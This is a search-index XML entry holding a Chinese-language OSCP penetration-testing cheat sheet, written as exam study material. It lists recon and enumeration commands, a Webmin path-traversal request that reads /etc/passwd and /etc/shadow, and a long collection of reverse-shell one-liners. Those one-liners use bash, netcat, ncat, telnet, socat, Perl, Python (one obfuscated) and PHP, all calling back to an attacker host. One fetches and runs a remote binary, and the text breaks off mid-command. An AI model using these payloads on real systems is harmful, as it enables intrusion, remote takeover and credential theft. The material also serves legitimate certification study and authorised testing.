<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OSCP指南</title>
      <link href="/2020/09/01/OSCP/"/>
      <url>/2020/09/01/OSCP/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP指南"><a href="#OSCP指南" class="headerlink" title="OSCP指南"></a>OSCP指南</h1><h2 id="1、kali-linux"><a href="#1、kali-linux" class="headerlink" title="1、kali linux"></a>1、kali linux</h2><h3 id="1-1-开启服务"><a href="#1-1-开启服务" class="headerlink" title="1.1 开启服务"></a>1.1 开启服务</h3><pre><code>systemctl start sshsystemctl start apache2</code></pre><p>开机自启服务</p><pre><code>systemctl enable ssh</code></pre><p>下载网页</p><pre><code>wget http://www.cisco.com</code></pre><p>打开网页</p><pre><code>curl http://www.cisco.com</code></pre><h3 id="1-2-使用Kali解码"><a href="#1-2-使用Kali解码" class="headerlink" title="1.2 使用Kali解码"></a>1.2 使用Kali解码</h3><ul><li>解码Base64编码值<code>echo -n &quot;QWxhZGRpbjpvcGVuIHNlc2FtZQ==&quot; | base64 --decode</code></li><li>解码十六进制编码值<code>echo -n &quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874&quot; | xxd -r -ps</code></li></ul><h3 id="1-3-Netcat"><a href="#1-3-Netcat" class="headerlink" title="1.3 Netcat"></a>1.3 Netcat</h3><p>读写TCP和UDP数据包</p><ul><li>连接到POP3邮件服务器<br><code>nc -nv $ip 110</code></li><li>侦听TCP / UDP端口<br><code>nc -nlvp 4444</code></li><li>连接到netcat端口<br><code>nc -nv $ip 4444</code></li><li>使用netcat发送文件<br><code>nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe</code></li><li>使用netcat接收文件<br><code>nc -nlvp 4444 &gt; incoming.exe</code></li><li>在Linux上使用bash使用Ncat创建反向Shell<br><code>nc -nv $ip 4444 -e /bin/bash</code></li></ul><h3 id="1-4-Ncat"><a href="#1-4-Ncat" class="headerlink" title="1.4 Ncat"></a>1.4 Ncat</h3><p>用于Nmap的Netcat项目，可提供更高的安全性，避免IDS</p><ul><li>使用SSL使用cmd.exe从Windows反转外壳<br><code>ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl</code></li><li>使用SSL侦听端口4444<br><code>ncat -v $ip 4444 --ssl</code></li></ul><h3 id="1-5-Wireshark"><a href="#1-5-Wireshark" class="headerlink" title="1.5 Wireshark"></a>1.5 Wireshark</h3><ul><li><p>仅显示SMTP（端口25）和ICMP流量：</p><p><code>tcp.port eq 25 or icmp</code></p></li><li><p>仅显示工作站和服务器之间的LAN（192.168.xx）中的流量-无Internet：</p><p><code>ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16</code></p></li><li><p>按协议过滤（例如SIP）并过滤掉不需要的IP：</p><p><code>ip.src != xxx.xxx.xxx.xxx &amp;&amp; ip.dst != xxx.xxx.xxx.xxx &amp;&amp; sip</code></p></li><li><p>有些命令是相等的</p><p><code>ip.addr == xxx.xxx.xxx.xxx</code></p><p>等于</p><p><code>ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx</code></p><p><code>ip.addr != xxx.xxx.xxx.xxx</code></p><p>等于</p><p><code>ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx</code></p></li></ul><h2 id="2、信息搜集"><a href="#2、信息搜集" class="headerlink" title="2、信息搜集"></a>2、信息搜集</h2><h3 id="2-1-被动信息搜集"><a href="#2-1-被动信息搜集" class="headerlink" title="2.1 被动信息搜集"></a>2.1 被动信息搜集</h3><ul><li><p>google hack</p></li><li><p>SSL证书测试<br><a href="http://web.archive.org/web/20171113221652/https://www.ssllabs.com/ssltest/analyze.html" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest/analyze.html</a></p></li><li><p>电子邮件收集</p><ul><li><p>只需发送电子邮件<br><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git</code></p><p><code>./SimplyEmail.py -all -e TARGET-DOMAIN</code></p></li></ul></li><li><p>LDAP</p><ul><li>LDAP空绑定<br><code>ldapsearch -x -b &quot;ou=anonymous,dc=challenge01,dc=root-me,dc=org&quot; -H &quot;ldap://challenge01.root-me.org:54013&quot;</code></li></ul></li><li><p>Netcraft</p><ul><li>确定用于构建站点的操作系统和工具<br><a href="http://web.archive.org/web/20171113221652/https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></li></ul></li><li><p>Whois枚举<br><code>whois domain-name-here.com</code></p></li></ul><h3 id="2-2-主动信息搜集"><a href="#2-2-主动信息搜集" class="headerlink" title="2.2 主动信息搜集"></a>2.2 主动信息搜集</h3><blockquote><p>$ip是变量</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table><thead><tr><th>/</th><th align="center">IP地址个数</th><th align="center">主机个数</th><th align="center">掩码</th><th align="center">C段个数</th></tr></thead><tbody><tr><td>/30</td><td align="center">4</td><td align="center">2</td><td align="center">255.255.255.252</td><td align="center">1/64</td></tr><tr><td>/29</td><td align="center">8</td><td align="center">6</td><td align="center">255.255.255.248</td><td align="center">1/32</td></tr><tr><td>/28</td><td align="center">16</td><td align="center">14</td><td align="center">255.255.255.240</td><td align="center">1/16</td></tr><tr><td>/27</td><td align="center">32</td><td align="center">30</td><td align="center">255.255.255.224</td><td align="center">1/8</td></tr><tr><td>/26</td><td align="center">64</td><td align="center">62</td><td align="center">255.255.255.192</td><td align="center">1/4</td></tr><tr><td>/25</td><td align="center">128</td><td align="center">126</td><td align="center">255.255.255.128</td><td align="center">1/2</td></tr><tr><td>/24</td><td align="center">256</td><td align="center">254</td><td align="center">255.255.255.0</td><td align="center">1</td></tr><tr><td>/23</td><td align="center">512</td><td align="center">510</td><td align="center">255.255.254.0</td><td align="center">2</td></tr><tr><td>/22</td><td align="center">1024</td><td align="center">1022</td><td align="center">255.255.252.0</td><td align="center">4</td></tr><tr><td>/21</td><td align="center">2048</td><td align="center">2046</td><td align="center">255.255.248.0</td><td align="center">8</td></tr><tr><td>/20</td><td align="center">4096</td><td align="center">4094</td><td align="center">255.255.240.0</td><td align="center">16</td></tr><tr><td>/19</td><td align="center">8192</td><td align="center">8190</td><td align="center">255.255.224.0</td><td align="center">32</td></tr><tr><td>/18</td><td align="center">16384</td><td align="center">16382</td><td align="center">255.255.192.0</td><td align="center">64</td></tr><tr><td>/17</td><td align="center">32768</td><td align="center">32766</td><td align="center">255.255.128.0</td><td align="center">128</td></tr><tr><td>/16</td><td align="center">65536</td><td align="center">65534</td><td align="center">255.255.0.0</td><td align="center">256</td></tr></tbody></table><ul><li><p>Nmap端口扫描</p><p>nmap -A -T4 -p80 $ip</p></li><li><p>Netcat端口扫描</p><p>nc -nvv -w 1 -z $ip 3388-3390</p></li><li><p>ARP扫描</p><p>arp-scan $ip/24</p></li><li><p>使用SYN进行Nmap隐形扫描<br><code>nmap -sS $ip</code></p></li><li><p>使用FIN进行Nmap隐形扫描<br><code>nmap -sF $ip</code></p></li><li><p>Nmap OS指纹识别<br><code>nmap -O $ip</code></p></li><li><p>Nmap常规扫描：<br><code>nmap $ip/24</code></p></li><li><p>枚举扫描<br><code>nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt</code></p></li><li><p>枚举扫描所有端口TCP / UDP并输出到txt文件<br><code>nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip</code></p></li><li><p>Nmap输出到文件：<br><code>nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24</code></p></li><li><p>快速扫描：<br><code>nmap -T4 -F $ip/24</code></p></li><li><p>快速扫描增强版：<br><code>nmap -sV -T4 -O -F --version-light $ip/24</code></p></li><li><p>快速跟踪路线<br><code>nmap -sn --traceroute $ip</code></p></li><li><p>所有TCP和UDP端口<br><code>nmap -v -sU -sS -p- -A -T4 $ip</code></p></li><li><p>强烈扫描：<br><code>nmap -T4 -A -v $ip</code></p></li><li><p>强烈扫描加UDP<br><code>nmap -sS -sU -T4 -A -v $ip/24</code></p></li><li><p>密集扫描所有TCP端口<br><code>nmap -p 1-65535 -T4 -A -v $ip/24</code></p></li><li><p>强烈扫描-无Ping<br><code>nmap -T4 -A -v -Pn $ip/24</code></p></li><li><p>ping扫描</p><p>nmap -sn $ip/24</p></li><li><p>缓慢的全面扫描<br><code>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; $ip/24</code></p></li><li><p>使用活动连接进行扫描，以清除旨在欺骗您的所有欺骗端口<br><code>nmap -p1-65535 -A -T5 -sT $ip</code></p></li></ul><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><strong>DNS枚举</strong></p><ul><li><p>NMAP DNS主机名查找</p><p><code>nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;</code></p></li><li><p>主机查询<br><code>host -t ns megacorpone.com</code></p></li><li><p>反向查找蛮力-查找相同范围内的域<br><code>for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v &quot;not found&quot;</code></p></li><li><p>执行DNS IP查找<br><code>dig a domain-name-here.com @nameserver</code></p></li><li><p>DNS区域传输<br>Windows DNS区域传输</p><pre><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></pre><p>Linux DNS区域传输</p><pre><code>dig axfr blah.com @ns1.blah.com</code></pre></li><li><p>DNS枚举<br><code>dnsenum zonetransfer.me</code></p></li><li><p>Nmap端口版本检测最大功率<br><code>nmap -vvv -A --reason --script=&quot;+(safe or default) and not broadcast&quot; -p &lt;port&gt; &lt;host&gt;</code></p></li><li><p>NFS（网络文件系统）枚举</p><ul><li>显示可挂载的NFS共享 <code>nmap -sV --script=nfs-showmount $ip</code></li></ul></li><li><p>RPC（远程过程调用）枚举</p><ul><li>无需用户名和密码即可连接到RPC共享并枚举特权 <code>rpcclient --user=&quot;&quot; --command=enumprivs -N $ip</code></li><li>使用用户名连接到RPC共享并枚举特权 <code>rpcclient --user=&quot;&lt;Username&gt;&quot; --command=enumprivs $ip</code></li></ul></li><li><p>SMB枚举</p><ul><li><p>SMB OS发现<br><code>nmap $ip --script smb-os-discovery.nse</code></p></li><li><p>Nmap端口扫描<br><code>nmap -v -p 139,445 -oG smb.txt $ip-254</code></p></li><li><p>Netbios信息扫描<br><code>nbtscan -r $ip/24</code></p></li><li><p>Nmap查找暴露的Netbios服务器<br><code>nmap -sU --script nbstat.nse -p 137 $ip</code></p></li><li><p>Nmap所有SMB脚本扫描</p><p><code>nmap -sV -Pn -vv -p 445 --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p></li><li><p>Nmap对所有SMB脚本进行身份验证扫描</p><p><code>nmap -sV -Pn -vv -p 445 --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p></li><li><p>SMB枚举工具<br><code>nmblookup -A $ip</code></p><p><code>smbclient //MOUNT/share -I $ip -N</code></p><p><code>rpcclient -U &quot;&quot; $ip</code></p><p><code>enum4linux $ip</code></p><p><code>enum4linux -a $ip</code></p></li><li><p>SMB指纹识别<br><code>smbclient -L //$ip</code></p></li><li><p>Nmap扫描打开的SMB共享<br><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24</code></p></li><li><p>Nmap扫描易受攻击的SMB服务器<br><code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip</code></p></li><li><p>Nmap列出所有已安装的SMB脚本<br><code>ls -l /usr/share/nmap/scripts/smb*</code></p></li><li><p>枚举SMB用户</p><p><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14</code></p><p>要么</p><p><code>python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip</code></p></li><li><p>RID循环-空会话<br><code>ridenum.py $ip 500 50000 dict.txt</code></p></li><li><p>手动空会话测试</p><p>视窗： <code>net use \\$ip\IPC$ &quot;&quot; /u:&quot;&quot;</code></p><p>Linux： <code>smbclient -L //$ip</code></p></li></ul></li><li><p>SMTP枚举-邮件服务器</p><ul><li>使用Netcat验证SMTP端口<br><code>nc -nv $ip 25</code></li></ul></li><li><p>POP3枚举-阅读其他人的邮件-您可能会找到电子邮件帐户的用户名和密码，因此这是使用Telnet检查邮件的方法</p><pre><code> root@kali:~# telnet $ip 110 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready  USER billydean     +OK PASS password +OK Welcome billydean list +OK 2 1807 1 786 2 1021 retr 1 +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login for remote desktop ... try not to forget it this time! username: billydean password: PA$$W0RD!Z</code></pre></li><li><p>SNMP枚举-简单的网络管理协议</p><ul><li>修复SNMP输出值，使它们易于阅读<br><code>apt-get install snmp-mibs-downloader download-mibs</code> <code>echo &quot;&quot; &gt; /etc/snmp/snmp.conf</code></li><li>SNMP枚举命令<ul><li><code>snmpcheck -t $ip -c public</code></li><li><code>snmpwalk -c public -v1 $ip 1|</code></li><li><code>grep hrSWRunName|cut -d\* \* -f</code></li><li><code>snmpenum -t $ip</code></li><li><code>onesixtyone -c names -i hosts</code></li></ul></li><li>SNMPv3枚举<br><code>nmap -sV -p 161 --script=snmp-info $ip/24</code></li><li>自动化SNMPv3的用户名枚举过程：<br><code>apt-get install snmp snmp-mibs-downloader</code> <code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</code></li><li>SNMP默认凭据<br>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</li></ul></li><li><p>MS SQL Server枚举</p><ul><li><p>Nmap信息收集</p><p><code>nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip</code></p></li></ul></li><li><p>Webmin和miniserv / 0.01枚举-端口10000</p><p>通过抓住/ etc / passwd测试LFI和文件泄露漏洞</p><pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`</code></pre><p>通过获取/ etc / shadow来测试webmin是否以root用户身份运行</p><pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`</code></pre></li><li><p>Linux OS枚举</p><ul><li>列出所有SUID文件<br><code>find / -perm -4000 2&gt;/dev/null</code></li><li>确定当前的Linux版本<br><code>cat /etc/issue</code></li><li>确定有关环境的更多信息<br><code>uname -a</code></li><li>列出正在运行的进程<br><code>ps -xaf</code></li><li>列出允许（和禁止）调用的命令<br><code>sudo -l</code></li><li>列出iptables规则<br><code>iptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security</code></li></ul></li><li><p>Windows操作系统枚举</p></li><li><p>net config Workstation 配置工作站</p></li><li><p>systeminfo | findstr /B /C:”OS Name” /C:”OS Version”</p></li><li><p>hostname</p></li><li><p>net users</p></li><li><p>ipconfig /all</p></li><li><p>route print</p></li><li><p>arp -A</p></li><li><p>netstat -ano</p></li><li><p>netsh firewall show state           </p></li><li><p>netsh firewall show config</p></li><li><p>schtasks /query /fo LIST /v</p></li><li><p>tasklist /SVC</p></li><li><p>net start</p></li><li><p>findstr /si password *.xml *.ini *.txt</p><p>从指定文件类型中查询密码</p></li><li><p>reg query HKLM /f password /t REG_SZ /s</p><p>注册表中查询密码</p></li><li><p>reg query HKCU /f password /t REG_SZ /s</p><p>注册表中查询密码</p></li></ul><h3 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h3><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h2 id="shells"><a href="#shells" class="headerlink" title="shells"></a>shells</h2><h3 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h3><h3 id="脚本有效载荷"><a href="#脚本有效载荷" class="headerlink" title="脚本有效载荷"></a>脚本有效载荷</h3><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h3 id="反弹shell方法汇总"><a href="#反弹shell方法汇总" class="headerlink" title="反弹shell方法汇总"></a>反弹shell方法汇总</h3><p>假设本机地址10.10.10.11，监听端口443。</p><h4 id="1、Bash环境下反弹TCP协议shell"><a href="#1、Bash环境下反弹TCP协议shell" class="headerlink" title="1、Bash环境下反弹TCP协议shell"></a>1、Bash环境下反弹TCP协议shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">bash -i &gt;&amp; /dev/tcp/10.10.10.11/443 0&gt;&amp;1</code></pre><pre><code class="bash">/bin/bash -i &gt; /dev/tcp/10.10.10.11/443 0&lt;&amp; 2&gt;&amp;1</code></pre><pre><code class="bash">exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><pre><code class="bash">exec /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</code></pre><pre><code class="bash">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre><h4 id="2、Bash环境下反弹UDP协议shell"><a href="#2、Bash环境下反弹UDP协议shell" class="headerlink" title="2、Bash环境下反弹UDP协议shell:"></a>2、Bash环境下反弹UDP协议shell:</h4><p>首先在本地监听UDP协议443端口</p><pre><code class="bash">nc -u -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">sh -i &gt;&amp; /dev/udp/10.10.10.11/443 0&gt;&amp;1</code></pre><h4 id="3、使用Netcat反弹shell"><a href="#3、使用Netcat反弹shell" class="headerlink" title="3、使用Netcat反弹shell"></a>3、使用Netcat反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">nc -e /bin/sh 10.10.10.11 443</code></pre><pre><code class="bash">nc -e /bin/bash 10.10.10.11 443</code></pre><pre><code class="bash">nc -c bash 10.10.10.11 443</code></pre><pre><code class="bash">mknod backpipe p &amp;&amp; nc 10.10.10.11 443 0&lt;backpipe | /bin/bash 1&gt;backpipe </code></pre><pre><code class="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt;/tmp/f</code></pre><pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre><pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt; f</code></pre><pre><code class="bash">rm -f x; mknod x p &amp;&amp; nc 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre><h4 id="4、使用Ncat反弹shell"><a href="#4、使用Ncat反弹shell" class="headerlink" title="4、使用Ncat反弹shell"></a>4、使用Ncat反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">ncat 10.10.10.11 443 -e /bin/bash</code></pre><pre><code class="bash">ncat --udp 10.10.10.11 443 -e /bin/bash</code></pre><h4 id="5、利用Telnet反弹shell"><a href="#5、利用Telnet反弹shell" class="headerlink" title="5、利用Telnet反弹shell"></a>5、利用Telnet反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre><pre><code class="bash">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</code></pre><pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</code></pre><pre><code class="bash">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre><h4 id="6、使用Socat反弹shell"><a href="#6、使用Socat反弹shell" class="headerlink" title="6、使用Socat反弹shell"></a>6、使用Socat反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">socat file:`tty`,raw,echo=0 TCP-L:443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre><pre><code class="bash">socat tcp-connect:10.10.10.11:443 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</code></pre><pre><code class="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre><h4 id="7、利用Perl脚本反弹"><a href="#7、利用Perl脚本反弹" class="headerlink" title="7、利用Perl脚本反弹"></a>7、利用Perl脚本反弹</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">perl -e &#39;use Socket;$i=&quot;10.10.10.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><pre><code class="bash">perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p>win平台下执行：</p><pre><code class="bash">perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><h4 id="8、利用Python脚本反弹shell"><a href="#8、利用Python脚本反弹shell" class="headerlink" title="8、利用Python脚本反弹shell"></a>8、利用Python脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><p>IPv4协议如下：</p><pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><pre><code class="bash">export RHOST=&quot;10.10.10.11&quot;;export RPORT=443;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>IPv6协议如下：</p><pre><code class="bash">python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#39;</code></pre><p>Windows平台如下:</p><pre><code class="bash">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.10.10.11&#39;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</code></pre><h4 id="9、利用PHP脚本反弹shell"><a href="#9、利用PHP脚本反弹shell" class="headerlink" title="9、利用PHP脚本反弹shell"></a>9、利用PHP脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">php -r &#39;$sock=fsockopen(&quot;10.10.10.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</code></pre><pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</code></pre><pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;</code></pre><pre><code class="bash">php -r 